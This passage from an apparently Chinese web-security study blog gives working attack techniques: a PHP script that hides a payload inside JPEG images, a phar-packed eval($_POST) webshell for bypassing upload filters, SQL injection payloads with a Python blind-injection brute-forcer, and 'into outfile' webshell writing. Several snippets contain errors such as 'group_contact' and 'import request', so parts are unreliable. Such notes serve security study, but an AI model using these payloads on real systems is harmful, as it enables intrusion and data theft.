class="hljs-title function_ invoke__">readShort</span>() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">skip</span>(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>();<br>                <span class="hljs-variable">$outStreamTmp</span> = <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                    <span class="hljs-variable">$miniPayload</span> . <br>                    <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                <span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> = <br>                        <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                        <span class="hljs-variable">$miniPayload</span> . <br>                        <span class="hljs-title function_ invoke__">substr</span>(<br>                            <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) || !<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;size - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-variable language_">$this</span>-&gt;binData||(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>用法：</p>
<p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为<code>2.jpg</code>；</p>
<p>执行命令<code>php jpg_payload.php 1.jpg</code>，生成图片马</p>
<p>其余同上。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/1ink/p/15115240.html">https://www.cnblogs.com/1ink/p/15115240.html</a></p>
<h4 id="phar文件上传绕过">phar文件上传绕过</h4>
<h5 id="phar协议">phar协议</h5>
<p>phar://、zip://、bzip2://、zlib://，用于读取压缩文件，均属于压缩流，可以访问压缩文件中的子文件，可以任意修改phar包的后缀为：<code>jpg png gif xxx</code> 等等。</p>
<h5 id="生成phar包">生成phar包</h5>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$payload</span> = <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span> ;<span class="hljs-comment">//一句话木马</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;example.phar&quot;</span>); <span class="hljs-comment">//这里为生成的phar包名称，后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;phar.php&quot;</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$payload</span>&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">// $phar-&gt;setMetadata(...); //在metadata添加内容，可参考 phar反序列化，此处用不着，故注释</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里需要修改php配置文件中的<code>readonly</code>项为off，才可以生成phar包，需要去掉前面默认的<code>;</code>。</p>
<p>结果如下图：</p>
<p>生成example.phar文件，里面包含压缩的phar.php文件，文件写有一句话木马。</p>
<p><img src="/2024/12/03/Web/1733886458034.png" srcset="/img/loading.gif" lazyload alt="1733886458034"></p>
<p>修改后缀为.zip实现文件上传。</p>
<p>有文件包含点：</p>
<p>访问上传的路径：phar://xxx.zip/phar，传参，即可实现RCE。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Leaf_initial/article/details/130152577?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-130152577-blog-134741062.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-130152577-blog-134741062.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;utm_relevant_index=1">https://blog.csdn.net/Leaf_initial/article/details/130152577?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-130152577-blog-134741062.235^v43^pc_blog_bottom_relevance_base2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-130152577-blog-134741062.235^v43^pc_blog_bottom_relevance_base2&amp;utm_relevant_index=1</a></p>
<h2 id="sql注入">sql注入</h2>
<h3 id="常用sql语句">常用sql语句</h3>
<p>CURD：create、update、read、delete增删改查操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">查：select username,password from user;<br>删：delete from user where username = &#x27;hello&#x27;;<br>插：insert into user (username,password) values (&#x27;hello&#x27;,&#x27;world&#x27;);<br>改：update user set password=&#x27;world!&#x27; where username = &#x27;hello&#x27;;<br></code></pre></td></tr></table></figure>
<h3 id="php-sql">php+sql</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#连接：</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$db</span>,<span class="hljs-variable">$port</span>);<br><span class="hljs-comment">#使用：</span><br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(sql语句);<br><span class="hljs-comment">#返回结果：</span><br><span class="hljs-comment">#所有：$result-&gt;fetch_all();</span><br><span class="hljs-comment">#一行：$result-&gt;fetch_array();</span><br></code></pre></td></tr></table></figure>
<h3 id="联合查询">联合查询</h3>
<h4 id="数字型">数字型</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询列数对应:<br>select xx,xx from table1 union select xx,xx from table2<br></code></pre></td></tr></table></figure>
<h4 id="字符型">字符型</h4>
<p>单双引号皆有可能，1后面的单引号闭合前面的单引号，后面的<code>%23</code>表示#，代表数据库注释，闭合后面的单引号。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">id = 1&#x27; union select 1,2,3... %23<br></code></pre></td></tr></table></figure>
<h3 id="列数猜测">列数猜测</h3>
<p>固定数字查询，列数对应正确返回，不一致报错。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select xx,xx from table1 union select 1,2,3...<br></code></pre></td></tr></table></figure>
<h3 id="回显某一列">回显某一列</h3>
<p>跳过第一行，返回二行的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select xx,xx from table1 union select 1,2,3 limit 1,2<br></code></pre></td></tr></table></figure>
<h3 id="查询具体信息">查询具体信息</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#用户名：<br>select xx,xx from table1 union select 1,(user()),3 limit 1,2<br>#查表：<br>select xx,xx from table1 union select 1,(select xx from table1 where xx=xx),3 limit 1,2<br></code></pre></td></tr></table></figure>
<h4 id="所有表名">所有表名</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select group_contact(table_name) from information_schema.tables where table_schema = database()<br></code></pre></td></tr></table></figure>
<h4 id="所有列名">所有列名</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select group_contact(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;xx&#x27;<br></code></pre></td></tr></table></figure>
<h3 id="布尔盲注">布尔盲注</h3>
<p>没有明显的回显点，只能确定是否正常执行。</p>
<h4 id="条件注入">条件注入</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#原语句<br>select xx,xx from table1 where username=&#x27;?&#x27;<br>#在?处注入，猜测第一条记录username的第一个字母是a<br>username = aa&#x27; or substr(username,1,1)=&#x27;a&#x27; and id=1 %23<br></code></pre></td></tr></table></figure>
<p>脚本实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> request<br><br>url = <span class="hljs-string">&quot;xx&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_length</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>        res = <span class="hljs-number">0</span><br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">f&quot;aa&#x27; or length(username)=<span class="hljs-subst">&#123;i&#125;</span> and id = 1#&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;whatever&quot;</span><br>        &#125;<br>        response = request.post(url=url,data=data)<br>        <span class="hljs-comment">#response = request.post(url=url,data=data,proxies=&#123;&#x27;http&#x27;:&#x27;127.0.0.1:8080&#x27;&#125;) #request与bp联合</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;成功&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            res = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_name</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br>    username = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>            data=&#123;<br>                <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">f&quot;aa&#x27; or substr(usrname,<span class="hljs-subst">&#123;i&#125;</span>,1)=<span class="hljs-subst">&#123;s&#125;</span> and id = 1#&quot;</span>,<br>                <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;whatever&quot;</span><br>            &#125;<br>            response = request.post(url=url,data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;成功&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                username += s<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> username<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    length = check_length()<br>    username = check_name(length)<br>    <span class="hljs-built_in">print</span>(username)<br></code></pre></td></tr></table></figure>
<h3 id="报错注入">报错注入</h3>
<p>没有明显的回显点，但有mysql语句执行的报错信息（报错点-&gt;回显点）。</p>
<p>利用<code>updatexml()</code>函数带出报错信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">username = a&#x27; or updatexml(1,contact(&#x27;~&#x27;,(select user()),&#x27;~&#x27;),1)%23<br></code></pre></td></tr></table></figure>
<p>其余可用函数：</p>
<p>extractvalue；（exp,pow,cot）整数溢出报错；不存在的函数名查库名，e.g. select a()等</p>
<h3 id="堆叠注入">堆叠注入</h3>
<p>通过<code>;</code>，执行多条sql语句，需后台支持。</p>
<p>如果可以堆叠，优先考虑存储过程：e.g.绕过select过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @a1=sele;set @a2=ct;set @payload=@a1+@a2<br></code></pre></td></tr></table></figure>
<h3 id="时间盲注">时间盲注</h3>
<p>没有回显点，无法知道执行结果。</p>
<p>通过语句来判断<code>if(比对语句，延迟语句，1)</code></p>
<ul>
<li>sleep()语句</li>
</ul>
<p>可以在if外再嵌套一个if(id=1,if(),1)来减少延迟时间，只判断第一条记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">username = a&#x27; or if((select substr(username,1,1) from user where id = 1)=&#x27;a&#x27;,sleep(1),1)#<br></code></pre></td></tr></table></figure>
<ul>
<li>benchmark(cnt,mark)</li>
</ul>
<p>执行mark数学公式cnt次，如果执行的公式耗时且次数多，可达成延迟的效果。</p>
<ul>
<li>笛卡尔积延迟法</li>
</ul>
<p>select cnt(*) from table1,table2;</p>
<p>记录数为table1记录数*table2记录数，呈指数增长，通过庞大的记录数来达成延迟的效果。</p>
<ul>
<li>get_lock()函数</li>
</ul>
<p>select get_lock(‘a’,3);</p>
<p>再次使用字符串’a’会造成延时效果，但只针对数据库连接的长连接，php一般解释执行完sql语句后就会关闭数据库连接，而java是维护数据库连接池的长时间连接。</p>
<ul>
<li>rlike</li>
</ul>
<p>通过大量正则匹配来实现延迟。</p>
<h3 id="二次注入">二次注入</h3>
<p>无法直接注入，但可以把注入数据插入到数据库，在其他引用数据库数据的地方，不需要过滤，间接执行sql语句。</p>
<h3 id="不同注入点的应对技巧">不同注入点的应对技巧</h3>
<ul>
<li>where之后：</li>
</ul>
<p>闭合参数引号后，有回显则联合注入，有报错则报错注入。</p>
<ul>
<li>column上：</li>
</ul>
<p>将column换成（select语句）</p>
<ul>
<li>group by或者order by之后：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">group by title,if(比对,延时,1)<br></code></pre></td></tr></table></figure>
<ul>
<li>limit之后（5.6版本之前）：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select xx,xx from table limit 1 procedure analyse(updatexml(1,concat(&#x27;~&#x27;,(select user()),&#x27;~&#x27;),1))<br></code></pre></td></tr></table></figure>
<h3 id="绕过小技巧">绕过小技巧</h3>
<ul>
<li>字符串表示数据时，可以转化为16进制使用</li>
<li>同相同功能的函数替换：substr-&gt;substring</li>
<li>数据读取转为数据写入：into outfile ‘/var/www/html/1.php’</li>
</ul>
<h2 id="php反序列化">php反序列化</h2>
<h3 id="类的属性">类的属性</h3>
<ul>
<li>public：外部对象可以通过&quot;-&gt;&quot;访问</li>
<li>private：内部对象通过&quot;this-&gt;&quot;访问</li>
<li>protect：自身及其子类、父类可以访问</li>
<li>static：每个对象中该值固定，不能被修改，可以通过类名直接调用<code>user::</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <br>&#125;<br><span class="hljs-comment">//继承</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">normaluser</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    (复制user的代码)<br>&#125;<br></code></pre></td></tr></table></figure>
<ul>
<li>final：修饰函数，子类无法覆盖</li>
</ul>
<h3 id="类的分类">类的分类</h3>
<ul>
<li>普通类</li>
<li>抽象类：函数可以没有具体实现，不能直接实例化，可以通过子类继承实现</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">play</span>(<span class="hljs-params"></span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<ul>
<li>接口类：所有函数借位抽象函数，可实现多继承效果</li>
</ul>
